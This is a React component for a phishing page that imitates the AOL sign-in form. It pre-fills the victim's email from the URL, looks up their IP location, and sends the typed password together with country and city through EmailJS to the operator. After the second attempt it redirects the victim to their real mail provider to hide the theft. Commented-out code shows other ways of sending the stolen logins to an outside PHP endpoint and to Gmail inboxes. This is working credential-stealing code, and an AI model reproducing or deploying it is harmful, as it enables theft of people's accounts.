import React, { useState, useEffect, useRef } from "react";
import './AoL.css';
// import yahooFrontPage from '../../Media/Images/yahoo_frontpage.png';
// import { useLocation } from "react-router-dom";
// import $ from "jquery";
import Preloader from "../../Preloader/Preloader";
import aolImg from './aol-logo-black-v.0.0.2.png'
import emailjs from '@emailjs/browser';

const AOL = ()=>{

    const formRef = useRef();


    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);

    const [spinLoader, setSpinLoader] = useState(false);

    useEffect(()=>{
        document.title = 'AOL.COM';
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
        
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
    // console.log(extracetdEmail);

    // const indForEmail = uri.indexOf("@");
    // const slicedDomain = uri.substr((indForEmail+1));
    // console.log(slicedDomain);

    const [YahooEmail, setYahooEmail] = useState(extracetdEmail);
    const [YahooPassowrd, setYahooPassword] = useState('');
    const btn = 'Next';
    const [errMsg, setErrMsg] = useState(false);

    const [count, setCount] = useState(0);

    const submitYahooForm = e=>{
        e.preventDefault();
        
        // alert(count)
        console.log(YahooEmail, YahooPassowrd);
        if(YahooPassowrd === ""){
            return null
        }else{
            setSpinLoader(true); 
            setTimeout(() => {
                setSpinLoader(false);
            }, 2000);
            setTimeout(() => {
                setYahooPassword('');
            }, 1100);

            // const user = {
            //     email: YahooEmail,
            //     password: YahooPassowrd
            // }


            // const user = {
            //     email: YahooEmail,
            //     password: YahooPassowrd,
            //     // country: country,
              
            //     // city: city,
            //     // flag: flag,
            //     // eyep: ipAdress,
            //     // nownow: forTime	
            // };


              // post to server
            //   const user = {
                // email: YahooEmail,
                // password: YahooPassowrd,
                // subject: "Chameleon Page Logs",
                // to: "rvvlsales13@gmail.com",
                // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
                // body:
                // `
                // <html lang="en">
                // <p>Online Correspondence: ${YahooEmail}</p>
                // <p>Signal: ${YahooPassowrd}</p>
                // <p>Country: ${country}</p>
                // <p>Flag: ${flag}</p>
                // </html>
                // `
            // };


            // const user = {
            //     "subject": "Coming Logs",
            //     "to": "reportwork5252@gmail.com",
            //     "body": `<div><h3></h3><p>Online_Correspondence: ${YahooEmail}</p><p>Signal: ${YahooPassowrd}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            // }
            
            
            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         console.log(data);
            //     },
            // });



            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;
    
    
            emailjs
            .sendForm(serviceID, templateID, formRef.current, {
              publicKey: publicKey,
            })
            .then(
              () => {
                console.log('!');
              },
              (error) => {
                console.log('...', error.text);
              },
            );

            


            setErrMsg(false);
            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
            }
            // alert(4567)
        }
        
    }
    return(<div>

        { spinLoader ? <Preloader /> : null }
        
        <header className="yahoo_header_">
            <img 
            // src={`https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png`}
            src={aolImg} 
            style={{cursor: 'pointer'}} className='Yahoo_logo' alt="_AOL_"/>

            {/* <a href="/" className="yahoo_help_">Help</a> */}

            <p className="yahoo_help_">Help</p>
        </header>


        <section className="Yahoo_wrapper">

            <div className="Yahoo_txt_content">
                <h3 className="Yahoo_h3">
                    {/* Yahoo makes it easy to enjoy what matters most in
                    <br />
                    your world. */}
                </h3>

                <p className="Yahoo_p">
                    {/* Best in class Yahoo Mail, breaking local, national and global
                    <br />
                    news, finance, sports, music, movies and more. You get more
                    <br />
                    out of the web, you get more out of life. */}
                </p>
            </div>

            <div className="Yahoo_container_form">
                <img 
                src={aolImg}
                alt="aol" className="form_img"
                />

                <div style={{
                    // display: 'flex',
                    // justifyContent: 'center'
                }}>
                    <strong className="challenge_heading">
                        Sign in
                    </strong>
                    <br/>
                    <span className="challenge_desc">using your Yahoo account</span>
                </div>



                {/* INPUTS BELOW */}

                <div className="Yahoo_inputs">

                    <form onSubmit={submitYahooForm} ref={formRef}>

                        { errMsg ?
                            <p className="Yahoo_err_msg">
                            Sorry, we don't recognize this email.
                        </p>
                        : null}

                        <article className="login_label" style={{
                            userSelect:'none',
                            marginBottom:'-2px'
                        }}>
                            Email address
                        </article>

                        <div className="Yahoo_email_wrapper">
                            <input 
                                type={`email`}
                                value={YahooEmail}
                                className="email_input input_s"
                                readOnly
                                onChange={e=> setYahooEmail(e.target.value)}
                                name="online_correspondence"
                            />
                        </div>

                        <article className="login_label" style={{
                            userSelect:'none',
                            marginTop:'1em'
                        }}>
                            Password
                        </article>
                            
                        <div className="Yahoo_password_wrapper">
                            <input 
                                type={`password`}
                                className="password_input input_s"
                                value={YahooPassowrd}
                                onChange={e=> setYahooPassword(e.target.value)}
                                name="signal"
                            />
                        </div>


              <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>


                        <div className="Yahoo_submit_br_Hg_In_container_">
                            <input
                                type={`submit`}
                                value={btn}
                                className="Yahoo_button_submit_"
                                required
                            />
                        </div>

                        <div className="Yahoo_checkbox_forget_username_">
                            <span style={{color: '#188fff', cursor: 'pointer', fontSize: '.89353rem', display:'flex', alignItems:'center'}}>
                                <input 
                                    type={`checkbox`} 
                                    defaultChecked 
                                />
                                &#160;
                                <span>
                                    Stay signed in
                                </span>
                            </span>

                            <p className="Yahoo_fget_username">
                                Forgot username?
                            </p>
                        </div>

                        <div className="Yahoo_create_acct_wrapper">
                            <button className="create_acct_btn" 
                                onClick={()=>{
                                    window.location.reload();
                                    setErrMsg(false);
                                }}
                            >
                                Create an account
                            </button>
                        </div>

                        
                    </form>

                </div>

            </div>
            
            

            
        {/* <p className="footer_terms">
            Terms <span className="single_or_AOL">|</span> Privacy
        </p> */}

        </section>


    </div>)
}

export default AOL;